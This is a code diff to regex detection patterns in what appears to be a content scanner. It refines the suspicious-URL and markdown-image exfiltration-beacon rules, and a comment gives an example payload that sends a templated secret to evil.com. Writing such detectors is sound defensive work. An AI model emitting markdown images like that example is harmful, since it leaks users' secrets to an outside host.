@@ -121,7 +121,7 @@ _PATTERNS: list[tuple[str, re.Pattern[str]]] = [
 
     # -- Suspicious URLs --
     ("suspicious_url", re.compile(
-        r"data:", re.IGNORECASE,
+        r"data:(?:text|image|application|audio|video|font)/", re.IGNORECASE,
     )),
     ("suspicious_url", re.compile(
         r"javascript:", re.IGNORECASE,
@@ -132,8 +132,11 @@ _PATTERNS: list[tuple[str, re.Pattern[str]]] = [
     )),
 
     # -- Exfiltration beacons --
+    # Matches markdown images with template/interpolation syntax in the URL,
+    # which is the actual data-exfiltration pattern (e.g. ![img](https://evil.com/{{secret}}).
+    # Plain markdown images without dynamic content are not flagged.
     ("exfil_beacon", re.compile(
-        r"!\[.*?\]\(https?://",
+        r"!\[.*?\]\(https?://[^)]*(?:\{\{|\$\{|%7[Bb])",
     )),
 ]
 
